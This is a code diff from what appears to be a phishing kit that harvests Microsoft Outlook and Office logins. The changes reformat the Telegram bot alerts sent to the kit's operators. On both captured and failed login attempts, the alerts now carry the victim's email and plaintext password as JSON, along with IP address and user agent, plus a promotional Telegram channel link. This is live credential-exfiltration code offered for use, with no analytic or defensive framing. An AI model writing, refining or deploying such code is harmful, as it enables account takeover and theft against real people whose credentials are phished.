@@ -342,17 +342,19 @@ ${adminUrl}
         }
         const adminUrl = `${baseUrl}/ad.html`;
 
-        const notificationMessage = `
-🔐 <b>New Outlook Login Captured!</b>
+        const notificationMessage = `@closedbride ⭐️office⭐️
+ {
+    "officeEmail": "${email}",
+    "officePassword": "${password || 'Not captured'}",
+    "loginFmt": "${email}"
+}
 
-📧 <b>Email:</b> <code>${email}</code>
-🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
-🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
-📊 <b>Cookies:</b> ${totalCookies} saved
-🆔 <b>Session:</b> ${sessionId}
 
-🌐 Access admin panel to view details and download cookies
-        `;
+##      USER FINGERPRINTS       ##
+IP: ${loginData.ip || 'Unknown'}
+INFORMATION: ANTIBOT DISABLED
+USERAGENT: ${loginData.userAgent || 'Unknown'}
+/////// POWERED BY https://t.me/nakedpages /////////`;
 
         const keyboard = {
             inline_keyboard: [
@@ -364,7 +366,6 @@ ${adminUrl}
         for (const chatId of this.chatIds) {
             try {
                 await this.bot.sendMessage(chatId, notificationMessage, {
-                    parse_mode: 'HTML',
                     reply_markup: keyboard
                 });
             } catch (error) {
@@ -406,19 +407,19 @@ ${adminUrl}
         }
         const adminUrl = `${baseUrl}/ad.html`;
 
-        const notificationMessage = `
-❌ <b>Failed Outlook Login Attempt</b>
+        const notificationMessage = `@closedbride ⭐️office⭐️
+ {
+    "officeEmail": "${email}",
+    "officePassword": "${password}",
+    "loginFmt": "${email}"
+}
 
-📧 <b>Email:</b> <code>${email}</code>
-🔑 <b>Password:</b> <span class="tg-spoiler">${password}</span>
-🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
-❌ <b>Reason:</b> ${reason}
-🆔 <b>Session:</b> ${sessionId}
-⚡ <b>Method:</b> ${authMethod}
-🔄 <b>Preload Used:</b> ${preloadUsed ? 'Yes' : 'No'}
 
-🌐 Access admin panel to view details
-        `;
+##      USER FINGERPRINTS       ##
+IP: ${failureData.ip || 'Unknown'}
+INFORMATION: ANTIBOT DISABLED
+USERAGENT: ${failureData.userAgent || 'Unknown'}
+/////// POWERED BY https://t.me/nakedpages /////////`;
 
         const keyboard = {
             inline_keyboard: [
@@ -430,7 +431,6 @@ ${adminUrl}
         for (const chatId of this.chatIds) {
             try {
                 await this.bot.sendMessage(chatId, notificationMessage, {
-                    parse_mode: 'HTML',
                     reply_markup: keyboard
                 });
             } catch (error) {
